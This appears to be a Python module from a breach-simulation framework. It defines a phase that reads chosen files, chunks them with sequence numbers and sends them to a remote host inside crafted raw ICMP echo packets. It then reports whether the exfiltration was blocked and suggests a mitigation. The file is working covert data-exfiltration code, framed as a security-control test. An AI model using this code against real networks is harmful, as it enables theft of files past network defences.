from ai_utils.scenarios.globals import NetworkUtils, FileUtils
from ai_utils.phases.abstract_phase import AbstractPhaseClass
import binascii
import logging
import struct
import socket
import os


class ExfiltrateFilesOverIcmpPhaseClass(AbstractPhaseClass):
  TrackerId = "226"
  Subject = "Ex-Filtrate Files Over icmp"
  Description = "Ex-Filtrate Files Over icmp"

  def __init__(self, is_phase_critical, exfil_url, exfil_files_list):
    AbstractPhaseClass.__init__(self, is_phase_critical)
    logging.debug('Executing ExfiltrateFilesOverIcmpPhaseClass constructor. is_phase_critical: {}, exfil_url: {}, exfil_files_list: {}'.format(is_phase_critical, exfil_url, exfil_files_list))
    self.exfiltration_url = exfil_url
    self.list_of_files_to_exfiltrate = exfil_files_list
    self.list_of_exfiltrated_files = []
    self.chunks = []
    self.icmp_packets = []
    self.icmp_socket = None

  def Setup(self):
    if not self.exfiltration_url:
      self.PhaseReporter.Error('Exfiltration URL parameter is required')
      return False
    if not self.list_of_files_to_exfiltrate:
      self.PhaseReporter.Error('List of Files to Exfiltrate parameter is required')
      return False
    return True

  def Run(self):
    logging.debug('Executing Run')
    success = self.exfiltrate_files()
    self.log_success(success)
    return success

  def exfiltrate_files(self):
    logging.debug('Executing exfiltrate_files')
    for file_to_exfiltrate in self.list_of_files_to_exfiltrate:
      if self.exfiltrate_file(file_to_exfiltrate):
        self.list_of_exfiltrated_files.append(file_to_exfiltrate)
        self.PhaseReporter.Info('Successfully exfiltrated file "{}" to "{}"'.format(os.path.basename(file_to_exfiltrate), self.exfiltration_url))
      else:
        self.PhaseReporter.Info('Failed to exfiltrate file "{}" to "{}"'.format(os.path.basename(file_to_exfiltrate), self.exfiltration_url))
    return len(self.list_of_exfiltrated_files) > 0

  def exfiltrate_file(self, file_to_exfiltrate):
    logging.debug('Executing exfiltrate_file. file_to_exfiltrate: {}'.format(file_to_exfiltrate))
    success = False
    try:
      success = self.read_and_exfiltrate_file(file_to_exfiltrate)
    except Exception as e:
      self.PhaseReporter.Error('File "{}" could not be exfiltrated to remote host "{}"'.format(file_to_exfiltrate, self.exfiltration_url))
      logging.exception(e)
    return success

  def read_and_exfiltrate_file(self, file_to_exfiltrate):
    logging.debug('Executing read_and_exfiltrate_file. file_to_exfiltrate: {}'.format(file_to_exfiltrate))
    success = False
    payload = FileUtils.ReadFromFile(file_to_exfiltrate)
    if payload:
      success = self.exfiltrate_payload(payload)
    elif payload == '':
      self.PhaseReporter.Warn('File "{}" is empty, data can not be exfiltrated'.format(file_to_exfiltrate))
    else:
      self.PhaseReporter.Error('File "{}" to be exfiltrated could not be read'.format(file_to_exfiltrate))
    return success

  def exfiltrate_payload(self, payload):
    logging.debug('Executing exfiltrate_payload. payload: {}(...)'.format(binascii.hexlify(payload)[:10]))
    success = False
    try:
      self.create_icmp_socket()
      self.create_small_chunks_within_icmp_limits(payload)
      self.prefix_tracking_number_for_reconstruction()
      self.create_icmp_packets()
      self.exfiltrate_over_icmp_socket()
      success = True
    except BaseException as e:
      self.PhaseReporter.Error('An error occurred trying to exfiltrate data through ICMP protocol. Error: {}'.format(e))
    return success

  def create_icmp_socket(self):
    logging.debug('Executing create_icmp_socket')
    icmp = socket.getprotobyname("icmp")
    self.icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)

  def create_small_chunks_within_icmp_limits(self, payload):
    logging.debug('Executing create_small_chunks_within_icmp_limits. payload: {}(...)'.format(binascii.hexlify(payload)[:10]))
    self.chunks = []
    interval = 1500 - 20 - 8 - 4
    for n in range(0, len(payload), interval):
      self.chunks.append(payload[n:n + interval])

  def prefix_tracking_number_for_reconstruction(self):
    logging.debug('Executing prefix_tracking_number_for_reconstruction')
    for n in range(len(self.chunks)):
      self.chunks[n] = struct.pack(">I", n) + self.chunks[n]

  def create_icmp_packets(self):
    logging.debug('Executing create_icmp_packets')
    self.icmp_packets = []
    for file_part in self.chunks:
      icmp_packet = struct.pack(">BBHHH%ds" % len(file_part), 8, 0, 0, 0, 0, file_part)
      icmp_packet = struct.pack(">BBHHH%ds" % len(file_part), 8, 0, NetworkUtils.Checksum(icmp_packet), 0, 0, file_part)
      self.icmp_packets.append(icmp_packet)

  def exfiltrate_over_icmp_socket(self):
    logging.debug('Executing exfiltrate_over_icmp_socket')
    for icmp_chunk in self.icmp_packets:
      self.icmp_socket.sendto(icmp_chunk, (self.exfiltration_url, 0))

  def log_success(self, success):
    logging.debug('Executing log_success. success: {}'.format(success))
    if success:
      self.PhaseResult['list_of_files_exfiltrated'] =  self.list_of_exfiltrated_files
      self.PhaseResult['exfiltration_url'] =  self.exfiltration_url
      self.PhaseReporter.Info('Successfully exfiltrated files over ICMP')
      self.PhaseReporter.Report('Data exfiltration through custom crafted ICMP packets was not blocked. Exfiltration URL: {}, Exfiltrated Files: {}'.format(self.exfiltration_url, ', '.join([os.path.basename(exfil_file) for exfil_file in self.list_of_exfiltrated_files])))
      self.PhaseReporter.Mitigation('Forbid or inspect data in ICMP traffic to remote host: {}, and for the following files: {}'.format(self.exfiltration_url, ', '.join([os.path.basename(exfil_file) for exfil_file in self.list_of_exfiltrated_files])))
    else:
      self.PhaseReporter.Info('Failed to exfiltrate files over ICMP')